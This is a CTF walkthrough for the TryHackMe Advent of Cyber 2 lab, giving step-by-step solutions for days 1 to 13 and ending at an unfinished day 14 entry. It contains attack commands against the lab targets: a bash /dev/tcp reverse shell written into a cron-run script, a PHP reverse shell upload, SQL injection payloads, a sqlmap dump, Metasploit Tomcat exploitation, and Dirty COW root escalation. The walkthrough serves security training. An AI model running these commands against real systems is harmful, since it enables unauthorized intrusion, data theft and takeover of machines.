#Advent_of_cyber Walkthrough

Hey Guys! Hope you all doing good. 

I will post the solution for the advent of cyber 2 room here after 1 or 2 days of breathing time for you to try by yourself. 
Room Link: https://tryhackme.com/room/adventofcyber2 

## Important Note: if you still feel its hard and not getting the concepts, kindly post the same in the Issues tab 

## Day 1 Solution Steps: A christmas crisis
1. Install browser extensions like ‘edit this cookie’ or any other cookie manager browser add
2. After login to the site - click on the add to view the cookie name (key) with just a one click - rather that going into the dev tools
3. Copy the auth cookie value and navigate to the cyberchef site https://gchq.github.io/CyberChef/ paste the same - a magic stick will appear click on it - it will show the encoded format and the decoded value below
4. The decoded value is in key:value pair in ‘JSON’ format
5. Replace your username in the decoded value with ‘santa’ value and encode the same with ‘Hex’
6. Copy paste the resulted value into your auth cookie and refresh the site - boom! You will logged in as santa user - activate all the button to get the flags 

## Day 2 Solution Steps: The elf strikes back.
1. At the end of you machine target IP add ‘/id=ODIzODI5MTNiYmYw’ it will look something like http://<IP>?id=ODIzODI5MTNiYmYw
2. Analysis response page script for the allowed extensions (.jpeg, .png) - the answer is ‘images’
3. Do dirsearch for the target machine with the default scripts or analysis the upload file POST request directory - the answer is ‘/uploads’
4. Upload the php reverse shell - get the php file from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php copy paste the code, edit the IP and port with your machine IP and your wish port and rename the extension as .jpeg.png and upload the same
5. Netcat with the flag ‘-nvlp’ on the same port 
6. Access the file in http://<IP>/uploads/<file>.php you will get the reverse shell, cat the flag file in /var/www/flag.txt to get the same   

## Day 3 Solution Steps: The Christmas chaos.
1. Load the target site IP into your browser
2. Configure the browser proxy with burp as instructed in the room 
3. Give some test credentials in the login page and capture the request in burp 
4. Sent the request to intruder by pressing ‘Ctrl+i’ then do the necessary steps to brute force the username and password as instructed in the room description 
5. Start the attack, after the attack completes analys the length of the response - one response will have a lesser response length
6. Select that response and analysis it will redirect to the site post successful login - note the username and password and use the same to login to the site - you will get the flag for this task

## Day 4 Solution Steps: Santa's watching 
1. For the question “Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)” - construct the command which will look like “wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ”
2. For the question “Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there?” run the following command “gobuster dir -u http://10.10.247.63/api/ -w /usr/share/wordlists/dirb/big.txt -x php,txt” which will give 200 response code for the file ‘site-log.php’
3. To get the correct date we have to fuzz the date parameter from the API endpoint http://<IP>/api/web-log.php?date=?
4. Run the below wfuzz command to get the correct date 
    ‘sudo wfuzz -c -z file,wordlist -u http://10.10.247.63/api/site-log.php?date=FUZZ --hw 0’

## Day 5 Solution Steps: Someone Stole Santa's Gift list
1. For the 1st we have guess for that we can use the general used in the site and website context - use hint for the same (as it says two words from the question) - ../santapanel will get you the site
2. On the login page use the sql command [ ‘ OR 1=1 /* ] on the username and leave the password blank  - this will take you into the site as the default user (may be admin)
3. On the website again use the same payload [ ‘ OR 1=1 /* ] this will create a true statement and will list all the entries available in the gift database - count it and enter the same
4. From the list for the name ‘paul’ we have ‘Github ownership’ as the gift enter the same 
5. Give some text at the search field and capture the request using the burp - Right click and save the request - on the sqlmap provide the comment sudo ‘sqlmap -r sqlrequest --batch --level 3 --risk 3 --dump’ to get the flag and admin password 

## Day 6 Solution Steps: Be Careful with what you wish on a christmas night
1. In the wise filed we have the stores XSS where our payload getting stored in BD with being sanitized at the client and server end 
2. Our payload are getting reflected back in to the site on the query parameter ‘q’
3. Open the ZAP proxy application and paste the URL into the automated scan and click on scan for the automated scanning - once the scan completes click the alert tab available at the bottom pan where you can see the potentials vulnerabilities (here we have 5) - In those 2 are related to XSS

## Day 7 Solution Steps: the Grinch really did steal a christmas 
1. Download the zip file from the challenge and unzip it - open the pcap1 file with wireshark tool and apply the filter ‘icmp’ to get all the ICMP related packets
2. For the question 2 we have to give the filter as ‘http.request.method == GET’ (gap and capital letters are important)
3. Apply the above filter and click on file > export object > http - select the /post/reindeer-of-the-week file and save the same as <file>.html - open this file with any browser and on analysing the content header it is about the topic ‘Reindeer-of-the-week’ performance letter in a internal blog post
4. Open the pcap2 file with wireshark and apply the filter ftp - analyse the traffic we can see a wrong password being entered error replay from the ftp server the password is ‘plaintext_password_fiasco’
5. If you try to see the content of SSH protocol you can’t as its been encrypted - answer for the 5th question 
6. Open the pcap3 file and apply the filter http - check for the ‘/christmas.zip’ file packet in the request and export the same under http protocol - save the content in .zip format - when you extract and open the file wishlist.txt you can see the wishes of McSkidy. Where he want to replace ‘rubber ducky’ 

## Day 8 Solution Steps: whats under the chrismas tree.
1. Snort is a free open source network intrusion detection system (IDS) and intrusion prevention system (IPS) created in 1998 by Martin Roesch, founder and former CTO of Sourcefire. Snort is now developed by Cisco, which purchased Sourcefire in 2013.
2. Run the nmap against the target - ‘sudo nmap <IP>’ we will get port 80, 2222 and 3389.
3. For the question 3 and 4 run the nmap commands ‘sudo nmap -Pn <IP>’ , ‘sudo nmap -A <IP>’ and ‘sudo nmap -sV <IP>’ and analyze the result which will provide answers for the rest of the questions 
4. From the ‘sudo nmap -sV <IP>’ result we can view that on the port 2222 ubuntu variant of Linux server is running 
5. On the scan ‘sudo nmap -A <IP>’ under port 80 you can see the HTTP-TITLE as ‘Internal Blog’ - so the website is based on Blog format

## Day 9 Solution Steps: Anyone can be Santa!
1. Connect with the target ftp server IP using the command ‘ftp <IP>’ for the username provide anonymous and it won’t ask for the password 
2. Navigate to the ‘public’ dir with command ‘cd public’ and download the two files using the command ‘get backup.sh’ and ‘get shoppinglist.txt’ - both the file will be downloaded to our local machine
3. Open both the file and analysis the same - in the file backup.sh it written that this file will be executed for every minute and the final backup will be done at the end of the day
4. Replace the content in the ‘backup.sh’ with the bash reverse shell comment ‘bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1’ to get the shell on the machine 
5. For the 1st question the answer is ‘public’ same as the directory we got these details 
6. For the 2nd question the answer is ‘backup.sh’ as we know this file is running every minutes 
7. Open the shoppinglist.txt and paste the same for the question 3 
8. Listen via netcat on you local machine once the connection established - cat /root/flag.txt and paste the same for the question 4

## Day 10 Solution Steps: Don't be selfish!
1. To get the user list use enum4linux with the following commands ‘enum4linux -U <target IP>’ - this will list all the users and their account for the samba share 
2. To get the share folder list use enum4linux with the following commands ‘enum4linux -S <target IP>’ - this will list all the share folders available in the samba share 
3. Try access all the share as some share won’t require password to access it - use the smbclient tool with the command ‘smbclient //<target Ip>/<folder name>’ - press enter if it request to enter password 
4. As we know we are able to access the tbfc-santa folder without password - enumerate further on this folder - use the command to access the folder ‘smbclient //10.10.23.174/tbfc-santa/’ then give commands like ‘ls’ and more to access the file inside the shared directory.

## Day 11 Solution Steps: The Rogue Gnome
1. If the privilege escalation involves using a user account to execute commands as an administrator its called vertical privilege escalation 
2. The name of the file that contains a list of users who are a part of the sudo group is sudoers
3. Login to the machine with SSH for the provided credentials 
4. Use the find command to get the SUID files ‘find / -u=s -file f 2>/dev/null’ it will list many file and binaries where we can run those as root - in that bash is stands out
5. Search for SUID in the GTFObin site for the bash binary - we can run the bash command like ‘bash -p’ in the provided shell to get the root access shell (bash shell with root access) - cat the flag.txt under /root/ directory

## Day 12 Solution Steps: Ready, set, elf.
1. Do an nmap scan on the target with -A flag and look at the web server version on the port 8080 (Apache tomcat 9.0.17)
2. Do google search for the vulnerabilities in the apache tomcat 9.0.17 version you will get some (2 vulnerabilities one is in yr 2017 and another in 2019) - the CVE witch is related to the RCE /cgi-bin/ - CVE-2019-0232 is the one for this server
3. Boot the msfconsole in your kali (attacking machine) search for tomcat 9.0 you will get 1 explicit use the same through cmd ‘use 1‘ and set all the options like RHOST, LHOST , TARGETURI - we have to go gobuster to get this target in actual case as there is a hint given for this challenge - use /cgi-bin/elfwhacker.bat and run the exploit to get the meterpreter shell
4. From the meterpreter shell Cat the flag file available in the cgi-bin folder 
5. From the same meterpreter shell type ‘use priv’ to load the privilege escalation scripts then type ‘getsystem’ to escalate to admin - type ‘getuid‘ to confirm the same or run 


## Day 13 Solution Steps: Coal for christmas 
1. Nmap the target with command nmap <target IP> and it has 3 open ports in the first 1000. Where we have port 23 (telnet port) - not been used as it has been replaced by SSH 
2. As the port telnet is open - we can grap the banner is they have any connect to the target IP using the telnet command as ‘telnet MACHINE_IP <PORT_FROM_NMAP_SCAN>’ - you will get the username and password to access the machine - connect to it either using the telnet or SSH
3. After SSH'd into the machine use the command ‘cat /etc/lsb-release’ to get the machine OS version - ubuntu 12.04
4. On the current directory cat the cookies_and_mike.txt and answer for the question - Grinch
5. As we have older version of OS (current version is >20.0) we can do kernel exploit called ‘Dirty COW (CVE-2016-5195)’  - to get the exploit (.c) file wget the same using the cmd ‘wget https://github.com/FireFart/dirtycow/blob/master/dirty.c’ after getting the file complete the same as exeutble using gcc as follow ‘gcc -pthread dirty.c -o dirty -lcrypt’
6. When you execute the exploit ‘./dirty’ you will be prompt for a password for the default user created ‘firefart’ provide the same and proceed further 
7. After the exploit execution - switch to the firefart user using the cmd ‘su firefart’ - BOOM! You are root now - verify the same with cmd ‘id’
8. Now on the same directory create a file ‘coal’ using the cmd ‘touch coal’ then type as follow ‘tree | md5sum > coal’ then ‘cat coal’ to get the hash for the final question of the day 

## Day 14 Solution Steps: typing ...
